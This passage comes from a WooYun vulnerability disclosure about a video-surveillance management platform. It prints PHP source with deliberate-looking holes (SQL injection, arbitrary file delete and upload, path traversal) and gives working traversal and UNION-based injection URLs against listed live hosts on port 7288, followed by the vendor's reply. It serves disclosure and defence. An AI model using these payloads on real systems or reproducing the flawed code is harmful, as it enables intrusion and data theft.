=\".$group;\t\t\t\t}\t\t\t\t}\t\t\t$str=\"\";\t\t\tif($configFlag == \"1\"){\t\t\t\t$str =\" and (c.is_transform is null or c.is_transform=0)\";\t\t\t}else if($configFlag == \"2\"){\t\t\t\t$str =\" and (c.is_stream_transmit is null or c.is_stream_transmit=0)\";\t\t\t}\t\t\t$re = $dbQuery->query('select distinct d.id,d.name,d.type_code,(select name from device_type_info where type_code = d.type_code) deviceType,d.reg_type regType,**.**.**.**work_addr networkAddr,**.**.**.**work_port networkPort,d.status,\"device\" type,d.indexcode,d.username,d.password from device_info d,camera_info c where d.indexcode=c.device_indexcode'.$unitWhere.$whereStr.$str.' order by d.'.$sort.' '.$order.' limit '.$start.','.$rows);\t\t\t$jsonArray = array();\t\t\t\t\t\t\t\t\t$count = $dbQuery->querySingle('select count(distinct d.id) from device_info d,camera_info c where d.indexcode=c.device_indexcode'.$unitWhere.$whereStr.$str);\t\t\twhile ($row = $dbQuery->fetchArray($re)){\t\t\t\t$pNode = new TreeNode();\t\t\t\t$pNode->setId('device_'.$row['id']);\t\t\t\t$pNode->setName($row['name']);\t\t\t\t$pNode->setTypeCode($row['type_code']);\t\t\t\t$pNode->setDeviceType($row['deviceType']);\t\t\t\t$pNode->setRegType($row['regType']);\t\t\t\t$pNode->setNetworkAddr($row['networkAddr']);\t\t\t\t$pNode->setNetworkPort($row['networkPort']);\t\t\t\t$pNode->setStatus($row['status']);\t\t\t\t$pNode->setType($row['type']);\t\t\t\t$pNode->setNum(0);\t\t\t\t$pNode->setIndexCode($row['indexcode']);\t\t\t\t$pNode->setUserName($row['username']);\t\t\t\t$pNode->setPassword($row['password']);\t\t\t\t$pNode->setIsTransform('/');\t\t\t\t$pNode->setIsStreamTransform('/');\t\t\t\t$pNode->setParentId(\"\");\t\t\t\t$pNode->setState('closed');\t\t\t\t$pNode->setChecked(false);\t\t\t\t$pNode->setIconCls('icon-deviceManage');\t\t\t\t//fetchCameraByDeviceId($dbQuery,$row['indexcode'],$pNode,$row['id'],$configFlag);\t\t\t\tarray_push($jsonArray,$pNode);\t\t\t}\t\t\t\t\t\t$str ='{\"total\":'.$count.',\"rows\":'.json_encode($jsonArray).'}';\t\t\t$dbQuery->closeDb();\t\t\techo $str;\t\t}else{\t\t\tfetchCameraByDeviceId($dbQuery,$deviceIndexCode,$deviceId,$show);\t\t}\t\t\t\t\t\tfunction fetchCameraByDeviceId($dbQuery,$deviceIndexCode,$deviceId,$show){\t\t\t$whereStr =\"\";\t\t\tif($show == \"1\"){\t\t\t\t$whereStr =\" and (a.is_transform is null or a.is_transform=0)\";\t\t\t}else if($show == \"2\"){\t\t\t\t$whereStr =\" and (a.is_stream_transmit is null or a.is_stream_transmit=0)\";\t\t\t}\t\t\t$re = $dbQuery->query('select a.id,a.name,\"/\" deviceType,\"/\" regType,\"/\" networkAddr,\"/\" networkPort,b.status,\"camera\" type,a.local_num num,a.indexcode,a.is_transform transform,a.is_stream_transmit streamTransmit from camera_info a,device_info b where a.device_indexcode=b.indexcode and a.device_indexcode=\"'.$deviceIndexCode.'\"'.$whereStr);\t\t\t$jsonArray = array();\t\t\twhile ($row = $dbQuery->fetchArray($re)){\t\t\t\t$cNode = new TreeNode();\t\t\t\t$cNode->setId('camera_'.$row['id']);\t\t\t\t$cNode->setName($row['name']);\t\t\t\t$cNode->setTypeCode(0);\t\t\t\t$cNode->setDeviceType($row['deviceType']);\t\t\t\t$cNode->setRegType($row['regType']);\t\t\t\t$cNode->setNetworkAddr($row['networkAddr']);\t\t\t\t$cNode->setNetworkPort($row['networkPort']);\t\t\t\t$cNode->setStatus($row['status']);\t\t\t\t$cNode->setChecked(false);\t\t\t\t$cNode->setType($row['type']);\t\t\t\t$cNode->setNum($row['num']);\t\t\t\t$cNode->setIndexCode($row['indexcode']);\t\t\t\t$cNode->setUserName(\"\");\t\t\t\t$cNode->setPassword(\"\");\t\t\t\t$cNode->setIsTransform($row['transform']);\t\t\t\t$cNode->setIsStreamTransform($row['streamTransmit']);\t\t\t\t$cNode->setIconCls('icon-camera');\t\t\t\t$cNode->setParentId($deviceId);\t\t\t\tarray_push($jsonArray,$cNode);\t\t\t}\t\t\t$str =json_encode($jsonArray);\t\t\t$dbQuery->closeDb();\t\t\techo $str;\t\t}?>\n第三十四处：/data/groupListData.php\n<?php\t\t\tinclude('../common/connDb.php');\t\t$dbQuery = new DataBaseQuery();\t\t$page=$_POST['page']; \t\t$rows=$_POST['rows'];\t\t$start=($page -1)*$rows;\t\t$re = $dbQuery->query('select * from device_group_info limit '.$start.','.$rows);\t\t$count = $dbQuery->querySingle('select count(*) from device_group_info');\t\t$jsonStr =\"\";\t\twhile ($row = $dbQuery->fetchArray($re)){\t\t\t$jsonStr = $jsonStr.json_encode($row).\",\";\t\t}\t\tif($jsonStr !=\"\"){\t\t\t$jsonStr = substr($jsonStr,0,strlen($jsonStr)-1);\t\t}\t\t$str ='{\"total\":'.$count.',\"rows\":['.$jsonStr.']}';\t\t$dbQuery->closeDb();\t\techo ($str);?>\n任意文件生成：/data/deletePlugFiles.php\n<?php\tinclude('../common/connDb.php');\t$dirName = $_POST['dirName'];\t$fileName = $_POST['fileName'];\t$filePath = '../../../../plugins/'.$dirName.'/'.$fileName;\tif (file_exists($filePath)) {\t\t$result=unlink($filePath);\t\tif($result){\t\t\techo 0;\t\t}else{\t\t\techo 1;\t\t}\t}else{\t\techo 1;\t}?>\n任意文件上传：\n<?php\tinclude('../common/connDb.php');\t$foldName = $_POST['foldName'];\t$foldPath = '../../../../plugins/'.$foldName;\tif(!file_exists($foldPath)){\t\tmkdir($foldPath,0777);  \t}\t$plugFiles = $_FILES['plugFile'];\tfor($i=0;$i<count($plugFiles['name']);$i++){\t\t//如果未出错\t\tif($_FILES['plugFile']['error'][$i]==0){\t\t\t if(!move_uploaded_file($_FILES['plugFile']['tmp_name'][$i],$foldPath.\"/\".$_FILES['plugFile']['name'][$i])){\t\t\t\t echo 1;\t\t\t\t return;\t\t\t }\t\t}\t}\techo 0;?>\n任意目录遍历：/remoteUpdate/showFile.php\n<?php\t$dirName = $_GET['fileName'];  //插件文件夹?><!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://**.**.**.**/TR/html4/loose.dtd\"><html><head>\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../easyui/themes/default/easyui.css\">  \t<link rel=\"stylesheet\" type=\"text/css\" href=\"../easyui/themes/icon.css\">  \t<link rel=\"stylesheet\" type=\"text/css\" href=\"../easyui/themes/particular_blue.css\">\t\t<script type=\"text/javascript\" src=\"../easyui/jquery-1.4.4.min.js\"></script>\t<script type=\"text/javascript\" src=\"../easyui/jquery.easyui.min.js\"></script>\t<script type=\"text/javascript\" src=\"../easyui/locale/easyui-lang-zh_CN.js\"></script>\t<script type=\"text/javascript\" src=\"../easyui/easyloader.js\"></script>\t<title>查看插件明细</title>\t<script>\t\t$(function(){\t\t\t$('#tree').tree({\t\t\t\tanimate:true,\t\t\t\tlines:true,\t\t\t\turl:'../data/fetchPlugJsonByFolder.php?dirName=<?php echo $dirName;?>',\t\t\t\tonContextMenu: function(e, node){\t\t\t\t\tif(node.iconCls !=\"icon-plugFold\"){\t\t\t\t\t\te.preventDefault();\t\t\t\t\t\t$('#tree').tree('select', node.target);\t\t\t\t\t\t$('#mmt').menu('show', {\t\t\t\t\t\t\tleft: e.pageX,\t\t\t\t\t\t\ttop: e.pageY\t\t\t\t\t\t});\t\t\t\t\t}\t\t\t\t\t\t}\t\t\t});\t\t\t$('#delete').click(function(){\t\t\t\tparent.$.messager.confirm('确认框', '您确定要删除?', function(r){\t\t\t\t\tif (r){\t\t\t\t\t\tvar fileName=$('#tree').tree('getSelected').id;\t\t\t\t\t\t$.ajax({\t\t\t\t\t\t\ttype: \"POST\",\t\t\t\t\t\t\turl: \"../data/deletePlugFiles.php\",\t\t\t\t\t\t\tdata: \"dirName=<?php echo $dirName;?>&fileName=\"+fileName,\t\t\t\t\t\t\tsuccess: function(msg){\t\t\t\t\t\t\t\tif(msg==\"0\"){\t\t\t\t\t\t\t\t\t$('#tree').tree('reload');\t\t\t\t\t\t\t\t}else{\t\t\t\t\t\t\t\t\tparent.$.messager.alert('提示','删除失败!','error');\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t}\t\t\t\t\t\t});\t\t\t\t\t\t\t\t\t\t\t}\n任意文件遍历：/serverLog/showFile.php\n<?php\t\t\t\t\t$file_name = $_GET['fileName'];\t\t\t\t\t$file_path = '../../../log/'.$file_name;\t\t\t\t\t$fp = fopen($file_path, \"r\");\t\t\t\t\twhile($line = fgets($fp)){\t\t\t\t\t\t$line = nl2br(htmlentities($line, ENT_COMPAT, \"utf-8\"));\t\t\t\t\t\techo '<span style=\"font-size:16px\">'.$line.'</span>';\t\t\t\t\t}\t\t\t\t\tfclose($fp);\t\t\t\t?>\n任意文件遍历：**.**.**.**:7288/serverLog/showFile.php?fileName=../web/html/serverLog/showFile.php\n\n随便手工验证一处注入：**.**.**.**:7288/transformServer/serverConfigInfo.php?transId=1 union select 1,2,3,(select GROUP_CONCAT(1,2) from camera_info),5,6,7,8,9,10,11,12,13,14--\n\n目录遍历：**.**.**.**:7288/remoteUpdate/showFile.php?fileName=../../../\n\n案例：\n**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/http://**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/http://**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/http://**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:8090/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/\n   修复方案：  你们懂的。   版权声明：转载请注明来源 YY-2012@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2016-03-06 09:58 厂商回复： 您好，该问题属于与WooYun-2016-   重复问题，该产品线目前已停产。我们会通过各种渠道对使用旧版本的客户平台进行加固升级。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}